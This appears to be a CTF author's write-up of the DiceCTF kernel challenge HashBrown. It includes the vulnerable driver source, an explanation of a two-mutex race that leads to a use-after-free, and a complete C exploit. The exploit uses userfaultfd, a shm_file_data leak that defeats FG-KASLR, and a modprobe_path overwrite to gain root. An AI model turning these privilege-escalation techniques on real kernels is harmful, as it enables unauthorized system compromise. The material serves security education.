@@ -1,0 +1,882 @@
+This was the first time [DiceCTF](https://ctftime.org/event/1236) has been hosted (by DiceGang), and overall, I think it was a quite a successful experience and the CTF had a high level of difficulty. I wrote a single challenge called HashBrown, which had 7 solves total. I thought I would make a brief and short writeup to summarize the intended path (which most solvers took).
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicLvDNZGzXd4CNJ_He6meF73pUrczvVp26BypxZS-KqeQFQHIvsfk5kA81fHS1a-n3dcRHhbPkcrDh7NQ4ohKu_zDEAqVrmJnMHK0fBturj7tK-cbgPpZnMYia4XNzg75s6SsHqz4GNvBI/w640-h490/chall_description.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicLvDNZGzXd4CNJ_He6meF73pUrczvVp26BypxZS-KqeQFQHIvsfk5kA81fHS1a-n3dcRHhbPkcrDh7NQ4ohKu_zDEAqVrmJnMHK0fBturj7tK-cbgPpZnMYia4XNzg75s6SsHqz4GNvBI/s879/chall_description.PNG)
+
+  
+
+The following is the challenge description.
+
+The kernel version was version 5.11, with SMEP, KPTI, and SMAP on. SMEP and KPTI aren't really big deals, but SMAP can make the process a more painful.
+
+Setting CONFIG_SLAB causes the kernel to not use the traditional default SLUB allocator (which preserves the freelist linked list metadata on the kernel heap); instead it uses the older SLAB allocator which doesn't keep metadata on the heap (but rather in a [slab manager that stores freed indices with the kmem_bufctl_t field](https://www.kernel.org/doc/gorman/html/understand/understand011.html)). [SLAB_FREELIST_RANDOM](https://cateee.net/lkddb/web-lkddb/SLAB_FREELIST_RANDOM.html) applies to both the SLAB and SLUB allocator, and is usually set in the kernels used in common distros (such as Ubuntu). I've experienced that feature multiple times during kernel exploits, and instead of having a nice linear heap that provides allocations in a deterministic order, the freelist order is scrambled and randomized upon initialization of new pages. Opening the module in GHIDRA/Binja/IDA also clearly reveals that usercopy is hardened.
+
+The most important addition to this kernel challenge is [FG-KASLR](https://lwn.net/Articles/824307/) (as I was inspired by [HXP ctf's kernel rop challenge](https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/) that had FG-KASLR), which is a non mainline kernel security feature that provides extra randomization on top of KASLR. Usually, even with ASLR, you can rebase an entire binary by rebasing the leaks off of the non ASLR'd offsets. FG-KASLR brings an extra layer of protection (while also adding a second to the boot time) by compiling many of the functions in its own section, and re-scrambling all the sections during boot. Offset leaks should no longer be deterministic, but FG-KASLR only applies to functions that satifies the following criteria: the function is written in C and is not in a few special specific sections. Pointers to kernel data or some of the earlier parts of kernel code (and I think even the kpti trampoline that is useful in exploitation) remains at a constant offset from kernel base.
+
+Now, let's take a look into the provided source code (players seem to have more fun with pwn when there is less reversing, so I released it 2 hours into the CTF):
+
+``` c
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/device.h>
+#include <linux/mutex.h>
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+
+#define DEVICE_NAME "hashbrown"
+#define CLASS_NAME  "hashbrown"
+
+MODULE_AUTHOR("FizzBuzz101");
+MODULE_DESCRIPTION("Here's a hashbrown for everyone!");
+MODULE_LICENSE("GPL");
+
+#define ADD_KEY 0x1337
+#define DELETE_KEY 0x1338
+#define UPDATE_VALUE 0x1339
+#define DELETE_VALUE 0x133a
+#define GET_VALUE 0x133b
+
+#define SIZE_ARR_START 0x10
+#define SIZE_ARR_MAX 0x200
+#define MAX_ENTRIES 0x400
+#define MAX_VALUE_SIZE 0xb0
+#define GET_THRESHOLD(size) size - (size >> 2)
+
+#define INVALID 1
+#define EXISTS 2
+#define NOT_EXISTS 3
+#define MAXED 4
+
+static DEFINE_MUTEX(operations_lock);
+static DEFINE_MUTEX(resize_lock);
+static long hashmap_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+
+static int major;
+static struct class *hashbrown_class  = NULL;
+static struct device *hashbrown_device = NULL;
+static struct file_operations hashbrown_fops = {.unlocked_ioctl = hashmap_ioctl};
+
+typedef struct 
+{
+    uint32_t key;
+    uint32_t size;
+    char *src;
+    char *dest;
+}request_t;
+
+struct hash_entry
+{
+    uint32_t key;
+    uint32_t size;
+    char *value;
+    struct hash_entry *next;
+};
+typedef struct hash_entry hash_entry;
+
+typedef struct
+{
+    uint32_t size;
+    uint32_t threshold;
+    uint32_t entry_count;
+    hash_entry **buckets;
+}hashmap_t;
+hashmap_t hashmap;
+
+static noinline uint32_t get_hash_idx(uint32_t key, uint32_t size);
+
+static noinline long resize(request_t *arg);
+static noinline void resize_add(uint32_t idx, hash_entry *entry, hash_entry **new_buckets);
+static noinline void resize_clean_old(void);
+
+static noinline long add_key(uint32_t idx, uint32_t key, uint32_t size, char *src);
+static noinline long delete_key(uint32_t idx, uint32_t key);
+static noinline long update_value(uint32_t idx, uint32_t key, uint32_t size, char *src);
+static noinline long delete_value(uint32_t idx, uint32_t key);
+static noinline long get_value(uint32_t idx, uint32_t key, uint32_t size, char *dest);
+
+#pragma GCC push_options
+#pragma GCC optimize ("O1")
+
+static long hashmap_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+{
+    long result;
+    request_t request;
+    uint32_t idx;
+
+    if (cmd == ADD_KEY) 
+    {
+        if (hashmap.entry_count == hashmap.threshold && hashmap.size < SIZE_ARR_MAX)
+        {
+            mutex_lock(&resize_lock);
+            result = resize((request_t *)arg);
+            mutex_unlock(&resize_lock);
+            return result;
+        }
+    }
+
+    mutex_lock(&operations_lock);
+    if (copy_from_user((void *)&request, (void *)arg, sizeof(request_t)))
+    {
+        result = INVALID;
+    }
+    else if (cmd == ADD_KEY && hashmap.entry_count == MAX_ENTRIES)
+    {
+        result = MAXED;
+    }
+    else
+    {
+        idx = get_hash_idx(request.key, hashmap.size);
+        switch(cmd)
+        {
+            case ADD_KEY:
+                result = add_key(idx, request.key, request.size, request.src);
+                break;
+            case DELETE_KEY:
+                result = delete_key(idx, request.key);
+                break;
+            case UPDATE_VALUE:
+                result = update_value(idx, request.key, request.size, request.src);
+                break;
+            case DELETE_VALUE:
+                result = delete_value(idx, request.key);
+                break;
+            case GET_VALUE:
+                result = get_value(idx, request.key, request.size, request.dest);
+                break;
+            default:
+                result = INVALID;
+                break;
+        }
+    }
+    mutex_unlock(&operations_lock);
+    return result;
+}
+
+static uint32_t get_hash_idx(uint32_t key, uint32_t size)
+{
+    uint32_t hash;
+    key ^= (key >> 20) ^ (key >> 12);
+    hash = key ^ (key >> 7) ^ (key >> 4);
+    return hash & (size - 1);
+}
+
+static noinline void resize_add(uint32_t idx, hash_entry *entry, hash_entry **new_buckets)
+{
+    if (!new_buckets[idx])
+    {
+        new_buckets[idx] = entry;
+    }
+    else
+    {
+        entry->next = new_buckets[idx];
+        new_buckets[idx] = entry;
+    }
+}
+
+static noinline void resize_clean_old()
+{
+    int i;
+    hash_entry *traverse, *temp;    
+    for (i = 0; i < hashmap.size; i++)
+    {
+        if (hashmap.buckets[i])
+        {
+            traverse = hashmap.buckets[i];
+            while (traverse)
+            {
+                temp = traverse;
+                traverse = traverse->next;
+                kfree(temp);
+            }
+            hashmap.buckets[i] = NULL;
+        }
+    }   
+    kfree(hashmap.buckets);
+    hashmap.buckets = NULL;
+    return;
+}
+
+static long resize(request_t *arg)
+{
+    hash_entry **new_buckets, *temp_entry, *temp;
+    request_t request;
+    char *temp_data;
+    uint32_t new_size, new_threshold, new_idx;
+    int i, duplicate;
+
+    if (copy_from_user((void *)&request, (void *)arg, sizeof(request_t)))
+    {
+        return INVALID;
+    }
+    if (request.size < 1 || request.size > MAX_VALUE_SIZE)
+    {
+        return INVALID;
+    }
+
+    new_size = hashmap.size * 2;
+    new_threshold = GET_THRESHOLD(new_size);
+    new_buckets = kzalloc(sizeof(hash_entry *) * new_size, GFP_KERNEL);
+
+    if (!new_buckets)
+    {
+        return INVALID;
+    }
+
+    duplicate = 0;
+    for (i = 0; i < hashmap.size; i++)
+    {
+        if (hashmap.buckets[i])
+        {
+            for (temp_entry = hashmap.buckets[i]; temp_entry != NULL; temp_entry = temp_entry->next)
+            {
+                if (temp_entry->key == request.key)
+                {
+                    duplicate = 1;
+                }
+                new_idx = get_hash_idx(temp_entry->key, new_size);
+                temp = kzalloc(sizeof(hash_entry), GFP_KERNEL);
+                if (!temp) 
+                {
+                    kfree(new_buckets);
+                    return INVALID;
+                }
+                temp->key = temp_entry->key;
+                temp->size = temp_entry->size;
+                temp->value = temp_entry->value;
+                resize_add(new_idx, temp, new_buckets);
+            }
+        }
+    }
+    if (!duplicate)
+    {
+        new_idx = get_hash_idx(request.key, new_size);
+        temp = kzalloc(sizeof(hash_entry), GFP_KERNEL);
+        if (!temp)
+        {
+            kfree(new_buckets);
+            return INVALID;
+        }
+        temp_data = kzalloc(request.size, GFP_KERNEL);
+        if (!temp_data)
+        {
+            kfree(temp);
+            kfree(new_buckets);
+            return INVALID;
+        }
+        if (copy_from_user(temp_data, request.src, request.size))
+        {
+            kfree(temp_data);
+            kfree(temp);
+            kfree(new_buckets);
+            return INVALID;
+        }
+        temp->size = request.size;
+        temp->value = temp_data;
+        temp->key = request.key;
+        temp->next = NULL;
+        resize_add(new_idx, temp, new_buckets);
+        hashmap.entry_count++;
+    }
+    resize_clean_old();
+    hashmap.size = new_size;
+    hashmap.threshold = new_threshold;
+    hashmap.buckets = new_buckets;
+    return (duplicate)?EXISTS:0;
+}
+
+static long add_key(uint32_t idx, uint32_t key, uint32_t size, char *src)
+{
+    hash_entry *temp_entry, *temp;
+    char *temp_data;
+    if (size < 1 || size > MAX_VALUE_SIZE)
+    {
+        return INVALID;
+    }
+
+    temp_entry = kzalloc(sizeof(hash_entry), GFP_KERNEL);
+    temp_data = kzalloc(size, GFP_KERNEL);
+    if (!temp_entry || !temp_data)
+    {
+        return INVALID;
+    }
+    if (copy_from_user(temp_data, src, size))
+    {
+        return INVALID;
+    }
+    temp_entry->key = key;
+    temp_entry->size = size;
+    temp_entry->value = temp_data;
+    temp_entry->next = NULL;
+
+    if (!hashmap.buckets[idx])
+    {
+        hashmap.buckets[idx] = temp_entry;
+        hashmap.entry_count++;
+        return 0;
+    }
+    else 
+    {
+        for (temp = hashmap.buckets[idx]; temp->next != NULL; temp = temp->next)
+        {
+            if (temp->key == key)
+            {
+                kfree(temp_data);
+                kfree(temp_entry);
+                return EXISTS;
+            }
+        }
+        if (temp->key == key)
+        {
+            kfree(temp_data);
+            kfree(temp_entry);
+            return EXISTS;
+        }
+        temp->next = temp_entry;
+        hashmap.entry_count++;
+        return 0;
+    }
+}
+
+static long delete_key(uint32_t idx, uint32_t key)
+{
+    hash_entry *temp, *prev;
+
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+    if (hashmap.buckets[idx]->key == key)
+    {
+        temp = hashmap.buckets[idx]->next;
+        if (hashmap.buckets[idx]->value)
+        {
+            kfree(hashmap.buckets[idx]->value);
+        }
+        kfree(hashmap.buckets[idx]);
+        hashmap.buckets[idx] = temp;
+        hashmap.entry_count--;
+        return 0;
+    }
+    temp = hashmap.buckets[idx];
+    while (temp != NULL && temp->key != key)
+    {
+        prev = temp;
+        temp = temp->next;
+    }
+    if (temp == NULL)
+    {
+        return NOT_EXISTS;
+    }
+    prev->next = temp->next;
+    if (temp->value)
+    {
+        kfree(temp->value);
+    }
+    kfree(temp);
+    hashmap.entry_count--;
+    return 0;
+}
+
+static long update_value(uint32_t idx, uint32_t key, uint32_t size, char *src)
+{
+    hash_entry *temp;
+    char *temp_data;
+
+    if (size < 1 || size > MAX_VALUE_SIZE)
+    {
+        return INVALID;
+    }
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+
+    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp->next)
+    {
+        if (temp->key == key)
+        {
+            if (temp->size != size)
+            {
+                if (temp->value)
+                {
+                    kfree(temp->value);
+                }
+                temp->value = NULL;
+                temp->size = 0;
+                temp_data = kzalloc(size, GFP_KERNEL);
+                if (!temp_data || copy_from_user(temp_data, src, size))
+                {
+                    return INVALID;
+                }
+                temp->size = size;
+                temp->value = temp_data;
+            }
+            else
+            {
+                if (copy_from_user(temp->value, src, size))
+                {
+                    return INVALID;
+                }
+            }
+            return 0;
+        }
+    }
+    return NOT_EXISTS;
+}
+
+static long delete_value(uint32_t idx, uint32_t key)
+{
+    hash_entry *temp;
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp->next)
+    {
+        if (temp->key == key)
+        {
+            if (!temp->value || !temp->size)
+            {
+                return NOT_EXISTS;
+            }
+            kfree(temp->value);
+            temp->value = NULL;
+            temp->size = 0;
+            return 0;
+        }
+    }
+    return NOT_EXISTS;
+}
+
+static long get_value(uint32_t idx, uint32_t key, uint32_t size, char *dest)
+{
+    hash_entry *temp;
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp->next)
+    {
+        if (temp->key == key)
+        {
+            if (!temp->value || !temp->size)
+            {
+                return NOT_EXISTS;
+            }
+            if (size > temp->size)
+            {  
+                return INVALID;
+            }
+            if (copy_to_user(dest, temp->value, size))
+            {
+                return INVALID;
+            }
+            return 0;
+        }
+    }
+    return NOT_EXISTS;
+}
+
+#pragma GCC pop_options
+
+static int __init init_hashbrown(void)
+{
+    major = register_chrdev(0, DEVICE_NAME, &hashbrown_fops);
+    if (major < 0)
+    {
+        return -1;
+    }
+    hashbrown_class = class_create(THIS_MODULE, CLASS_NAME);
+    if (IS_ERR(hashbrown_class))
+    {
+        unregister_chrdev(major, DEVICE_NAME);
+        return -1;
+    }
+    hashbrown_device = device_create(hashbrown_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
+    if (IS_ERR(hashbrown_device))
+    {
+        class_destroy(hashbrown_class);
+        unregister_chrdev(major, DEVICE_NAME);
+        return -1;
+    }
+    mutex_init(&operations_lock);
+    mutex_init(&resize_lock);
+
+    hashmap.size = SIZE_ARR_START;
+    hashmap.entry_count = 0;
+    hashmap.threshold = GET_THRESHOLD(hashmap.size);
+    hashmap.buckets = kzalloc(sizeof(hash_entry *) * hashmap.size, GFP_KERNEL);
+    printk(KERN_INFO "HashBrown Loaded! Who doesn't love Hashbrowns!\n");
+    return 0;
+}
+
+static void __exit exit_hashbrown(void)
+{
+    device_destroy(hashbrown_class, MKDEV(major, 0));
+    class_unregister(hashbrown_class);
+    class_destroy(hashbrown_class);
+    unregister_chrdev(major, DEVICE_NAME);
+    mutex_destroy(&operations_lock);
+    mutex_destroy(&resize_lock);
+    printk(KERN_INFO "HashBrown Unloaded\n");
+}
+
+module_init(init_hashbrown);
+module_exit(exit_hashbrown);
+```
+
+To summarize the codebase, it is basically a hashmap in a driver, that can hold a maximum of 0x400 entries with a maximum array size of 0x200. Threshold is generally held at 0.75 and the hash function is copied from the JDK codebase before version 8. The overall code is also quite safe, as double frees, null dereferences, etc. are all checked throughout, and the linked list operations are also safe when collisions occur for the hashmap buckets. Size and error checks are also performed, and kzalloc() is used to null out newly allocated regions (to prevent leaks and such). However, having two mutex locks - one for resize and one for all other hashmap operations is quite strange, so perhaps it is a good idea to take a closer look at the resize function.
+
+When resize is triggered, a new hashmap that has an array that is twice as large as the old one is initialized, but the global hashmap struct does not have its bucket field replaced yet. In order to not corrupt the linked list in the previous hashmap or lose hash entries, the module has to allocate new hash entries and copy over the data (including the value pointer of the key value pair of hashmap entries), and then place them in the newly allocated hashmap bucket accordingly (debugging this structure can be somewhat painful, so perhaps writing a gdb python handler can help). If the new request from the user is also valid, resize proceeds to userland copy the data over. Then, all the old hash_entries are freed (but not the values, as that won't make sense) and the old bucket is freed, before the global hashmap has its bucket array replaced.
+
+While the resize function does sound safe, let us go back to the point about the 2 mutexes. Notice how a race condition can be created here? If we can get the hashmap resize to trigger and have it copy over values while also deleting a value (that is already copied over) from the current buckets, we can create a UAF scenario! If one mutex was used instead, or the bucket was replaced immediately in resize, this would not be an issue. I was hoping this would make for a more interesting CTF challenge bug, rather than a standard obvious heap note UAF or overflow by X scenario.
+
+Now that we know the bug, we can come up with an exploitation plan. The first thing we need to do is to create a stable race scenario; otherwise your success rate will be quite low and you will run out resize operations really quickly. This is quite easy, as an add request when the threshold limit is hit causes the userland copy for the new entry to be handled in the code of resize(). We can use the classic userfaultfd pagefault technique to hang kernel threads on userland copy. 
+
+On a sidenote, that setting has been the default for a very long time, but has actually been [disabled in the 5.11 release candidate codebase](https://elixir.bootlin.com/linux/v5.11-rc3/source/fs/userfaultfd.c#L31); I had to make a one line patch in the kernel to revert it to the traditional behavior, but did not make note of that in the description as it is trivially easy to check that setting during OS runtime, would spoil the challenge if I explicitly changed the setting in the init script, and building the kernel with fg-kaslr with other versions was a mess.
+
+Since the value allocations are capped at 0xb0, there is a limited range of useful kernel structures we can trigger to obtain leaks. A potential go-to would be seq_operations, but it only holds 4 function pointers that are all affected by FG-KASLR. I used [shm_file_data](https://elixir.bootlin.com/linux/v5.11-rc3/source/ipc/shm.c#L74), which contains pointers to kernel data. To leak this, we allocate just enough to the first threshold limit, and then trigger a resize. Once the resize function finishes copying over all the old hash_entries (including the value pointers), we use uffd technique to hang it, delete a value in another thread and use shmat to trigger an allocation of shm_file_data. After resize, we can still read that pointer value and we will be able to rebase kernel base.
+
+In order to obtain arb write, we can follow a similar plan as the method used for leak. However, as SMAP is enabled, our options for gaining arb exec is quite limited. One nice technique to bypass SMAP is to overwrite some of the writeable strings the kernel uses in conjunction with usermode helper functions; modprobe_path is probably the most famous one, but many other also exist. We should use the race condition to UAF over a kmalloc-32 chunk to eventually overwrite the value pointer of a hash_entry that is allocated later. It is important to note that all the hash_entires in the current global bucket is freed as well, so the UAF'd chunk will not be the first chunk returned; you can easily check when you have control over a hash_entry by repeatedly using get_value. I noticed that the returning order of the freelist was somewhat deterministic but recall that this order was also scrambled in a previous kernel challenge; please let me know if you can clarify this part for me but I believe it is because a new page is not needed (and hence, shuffling doesn't occur).
+
+Here is my final exploit and the result of running the exploit:
+
+``` c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <pthread.h>
+#include <poll.h>
+#include <assert.h>
+#include <sys/prctl.h>
+#include <sys/shm.h>
+#include <sys/wait.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/userfaultfd.h>
+
+#define UFFDIO_API 0xc018aa3f
+#define UFFDIO_REGISTER 0xc020aa00
+#define UFFDIO_UNREGISTER 0x8010aa01
+#define UFFDIO_COPY 0xc028aa03
+#define UFFDIO_ZEROPAGE 0xc020aa04
+#define UFFDIO_WAKE 0x8010aa02
+
+#define ADD_KEY 0x1337
+#define DELETE_KEY 0x1338
+#define UPDATE_VALUE 0x1339
+#define DELETE_VALUE 0x133a
+#define GET_VALUE 0x133b
+
+pthread_t thread;
+uint64_t race_page;
+static void (*race_function)();
+int target_idx;
+uint64_t kbase, shmem_vm_ops, modprobe_path;
+int fd;
+
+typedef struct 
+{
+    uint32_t key;
+    uint32_t size;
+    char *src;
+    char *dest;
+}request_t;
+
+long ioctl(int fd, unsigned long request, unsigned long param)
+{
+    return syscall(16, fd, request, param);
+}
+
+long add_key(int fd, uint32_t key, uint32_t size, char *src) 
+{
+    request_t request;
+    request.key = key;
+    request.size = size;
+    request.src = src;
+
+    return ioctl(fd, ADD_KEY, (unsigned long)&request);
+}
+
+long delete_key(int fd, uint32_t key) 
+{
+    request_t request;
+    request.key = key;
+
+    return ioctl(fd, DELETE_KEY, (unsigned long)&request);
+}
+
+long update_value(int fd, uint32_t key, uint32_t size, char *src) 
+{
+    request_t request;
+    request.key = key;
+    request.size = size;
+    request.src = src;
+
+    return ioctl(fd, UPDATE_VALUE, (unsigned long)&request);
+}
+
+long delete_value(int fd, uint32_t key) 
+{
+    request_t request;
+    request.key = key;
+
+    return ioctl(fd, DELETE_VALUE, (unsigned long)&request);
+}
+
+long get_value(int fd, uint32_t key, uint32_t size, char *dest) 
+{
+    request_t request;
+    request.key = key;
+    request.size = size;
+    request.dest = dest;
+
+    return ioctl(fd, GET_VALUE, (unsigned long)&request);
+}
+
+void leak_setup()
+{
+    int shmid; // shm_file_data (kmalloc-32) leak for kernel data leak to rebase kernel with fg kaslr
+    char *shmaddr;
+
+    puts("setting up for leak");
+    delete_value(fd, target_idx);
+    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
+    {
+        perror("shmget error");
+        exit(-1);
+    }
+    shmaddr = shmat(shmid, NULL, 0);
+    if (shmaddr == (void*)-1) 
+    {
+        perror("shmat error");
+        exit(-1);
+    }
+    return;
+}
+
+void uaf_setup()
+{
+    puts("setting up uaf");
+    delete_value(fd, target_idx);
+}
+
+void *racer(void *arg)
+{
+    struct uffd_msg uf_msg;
+    struct uffdio_copy uf_copy;
+    struct uffdio_range uf_range;
+    long uffd = (long)arg;
+    struct pollfd pollfd;
+    int nready;
+
+    pollfd.fd = uffd;
+    pollfd.events = POLLIN;
+
+    uf_range.start = race_page;
+    uf_range.len = 0x1000;
+
+    while(poll(&pollfd, 1, -1) > 0)
+    {
+        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
+        {
+            perror("polling error");
+            exit(-1);
+        }
+        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
+        {
+            perror("error reading event");
+            exit(-1);
+        }
+        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
+        {
+            perror("unexpected result from event");
+            exit(-1);
+        }
+        
+        race_function();
+
+        char uf_buffer[0x1000];
+        uf_copy.src = (unsigned long)uf_buffer;
+        uf_copy.dst = race_page;
+        uf_copy.len = 0x1000;
+        uf_copy.mode = 0;
+        uf_copy.copy = 0;
+        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
+        {
+            perror("uffdio_copy error");
+            exit(-1);
+        }
+        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
+        {
+            perror("error unregistering page for userfaultfd");
+        }
+        if (munmap((void *)race_page, 0x1000) == -1)
+        {
+            perror("error on munmapping race page");
+        }
+        return 0;
+    }
+    return 0;
+}
+
+void register_userfault()
+{
+    int uffd, race;
+    struct uffdio_api uf_api;
+    struct uffdio_register uf_register;
+
+    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    uf_api.api = UFFD_API;
+    uf_api.features = 0;
+
+    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
+    {
+        perror("error with the uffdio_api");
+        exit(-1);
+    }
+
+    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
+    {
+        perror("whoopsie doopsie on mmap");
+        exit(-1);
+    }
+
+    uf_register.range.start = race_page;
+    uf_register.range.len = 0x1000;
+    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+
+    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
+    {
+        perror("error registering page for userfaultfd");
+    }
+
+    race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
+    if(race != 0)
+    {
+        perror("can't setup threads for race");
+    }
+    return;
+}
+
+void modprobe_hax()
+{
+    char filename[65];
+    memset(filename, 0, sizeof(filename));
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/roooot");
+    system("chmod +x /home/ctf/roooot");
+    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt' > /home/ctf/w\n");
+    system("chmod +x /home/ctf/w");
+    system("/home/ctf/roooot");
+    return;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    // bug is two mutexes used (one for resize, one for all other operatios) -> allows for race conditions in ioctl handler
+    fd = open("/dev/hashbrown", O_RDONLY);
+
+    for (int i = 0; i < 0x50; i++)
+    {
+        open("/proc/self/stat", O_RDONLY);
+    }
+
+    char buf[0xb0];
+    char smallbuf[0x20];
+    int uaf_entry;
+    request_t evil;
+
+    // going for leaks
+    add_key(fd, 0, sizeof(smallbuf), smallbuf);
+    for (int i = 1; i < 12; i++)
+    {
+        memset(buf, 0x41 + i, sizeof(buf));
+        add_key(fd, i, sizeof(buf), buf);
+    }
+    race_page = 0xbaad0000;
+    race_function = &leak_setup;
+    target_idx = 0;
+    // using classic uffd technique for race
+    register_userfault();
+
+    add_key(fd, 27, sizeof(buf), (char *)race_page);
+    pthread_join(thread, NULL);
+
+    get_value(fd, 0, sizeof(smallbuf), smallbuf);
+
+    memcpy((void *)&shmem_vm_ops, (void *)&(smallbuf[0x18]), 0x8);
+    kbase = shmem_vm_ops - 0x822b80;
+    modprobe_path = kbase + 0xa46fe0;
+
+    // fg-kaslr doesn't affect some of the earlier functions in .text, nor functions not in C or data, etc.
+    printf("leaked shmem_vm_ops: 0x%llx\n", shmem_vm_ops);
+    printf("kernel base: 0x%llx\n", kbase);
+    printf("modprobe_path: 0x%llx\n", modprobe_path);
+
+    // clean up
+    for (int i = 1; i < 12; i++)
+    {
+        delete_key(fd, i);
+    }
+    delete_key(fd, 27);
+
+    // set up for second race
+    for (int i = 1; i <= 22; i++)
+    {
+        add_key(fd, i, sizeof(buf), buf);
+    }
+    add_key(fd, 1337, sizeof(smallbuf), smallbuf);
+
+    race_page = 0xf00d0000;
+    race_function = &uaf_setup;
+    target_idx = 1337;
+
+    register_userfault();
+
+    add_key(fd, 23, 0x20, (char *)0xf00d0000);
+    pthread_join(thread, NULL);
+    
+    // retrieval is somewhat deterministic, shuffling only happens when new slab is applied for?
+    for (int i = 24; i < 0x400; i++)
+    {
+        add_key(fd, i, sizeof(buf), buf);
+    }
+    get_value(fd, target_idx, sizeof(smallbuf), smallbuf);
+    uaf_entry = *(int *)smallbuf;
+    printf("uaf'd entry: %d\n", uaf_entry);
+
+    // clean up
+    for (int i = 1; i < 0x400; i++)
+    {
+        if (i != uaf_entry)
+        {
+            delete_key(fd, i);
+        }
+    }
+
+    // evil hash entry
+    evil.key = uaf_entry;
+    evil.size = 0x20;
+    evil.src = (char *)modprobe_path;
+    evil.dest = NULL;
+
+    memset(smallbuf, 0, sizeof(smallbuf));
+    memcpy(smallbuf, (void *)&evil, sizeof(evil));
+    update_value(fd, target_idx, sizeof(smallbuf), smallbuf);
+    memset(smallbuf, 0, sizeof(smallbuf));
+    strcpy(smallbuf, "/home/ctf/w");
+    update_value(fd, uaf_entry, sizeof(smallbuf), smallbuf);
+    modprobe_hax();
+}
+```
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhODKvQQOGVjtsEmiWXe-SPIIa7jxzitWi9PtN8dii7NBWPOBr8xnYFw9qXHQXUx07QZ7jxmFmUg576Gxsjqw7R_m0JFSEAIWyOzuy_wrUtApSfA9S1Jy_qkgoRScMuQgmvse9iQmkweuub/w640-h186/flag.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhODKvQQOGVjtsEmiWXe-SPIIa7jxzitWi9PtN8dii7NBWPOBr8xnYFw9qXHQXUx07QZ7jxmFmUg576Gxsjqw7R_m0JFSEAIWyOzuy_wrUtApSfA9S1Jy_qkgoRScMuQgmvse9iQmkweuub/s697/flag.PNG)
+
+Another interesting solution I saw came from LevitatingLion of RedRocket CTF team. The exploit used a nice arb read write primitive to start reading for kernel data at 0xffffffffc0000000 scanning for kernel data and the modprobe string (like a pseudo-egghunt) to bypass FG-KASLR.
+
+Feel free to let me know if any of my explanations were wrong, or let me know if you have any questions. Congrats to Pernicious from RPISEC for taking first blood and D3v17 for doing last minute testing for me! Thanks once again to all those who participated in DiceCTF and fellow organizers (especially the infra people asphyxia and ginkoid), and make sure to check out the other writeups, such as kmh's extreme pyjail challenge [TI1337 Plus CE](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/), defund's [crypto challs](https://priv.pub/posts/dicectf-2021/), and NotDeGhost's Chromium sandbox escape challenge [Adult CSP](https://blog.robertchen.cc/2021/02/07/adult-csp/).
